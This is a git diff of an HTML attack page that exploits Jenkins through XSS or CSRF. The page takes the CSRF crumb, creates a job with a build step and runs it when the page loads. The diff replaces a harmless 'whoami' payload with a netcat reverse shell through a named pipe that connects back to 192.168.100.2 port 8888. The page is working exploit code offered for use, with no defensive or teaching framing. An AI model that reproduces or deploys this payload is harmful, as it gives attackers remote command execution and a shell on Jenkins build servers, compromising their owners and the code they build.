@@ -3,7 +3,7 @@ getCrumb will work only under the same domain (so it must be used VIA XSS or oth
 So if you want to host script on some phishy domain, it will work only on jenkins without CSRF protection enabled 
 -->
 <html>
-  <body onload="sendPayload('ZN_Shell_test','lol','http://192.168.100.6:8080')">
+  <body onload="sendPayload('ZN_Shell','lol','http://192.168.100.6:8080')">
     <div>
       Sample malicious plugin page
       <p>Your crumb is:<div id="crumb"></div></p>
@@ -59,7 +59,7 @@ So if you want to host script on some phishy domain, it will work only on jenkin
         }
 
         function sendPayload(name, payload, host){
-          var Payload = "whoami"
+          var Payload = encodeURI("mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 192.168.100.2 8888 1>/tmp/backpipe");
           createJob(name, host);
           addBuildStep(name, Payload, host);
           rubBuild(name,host);
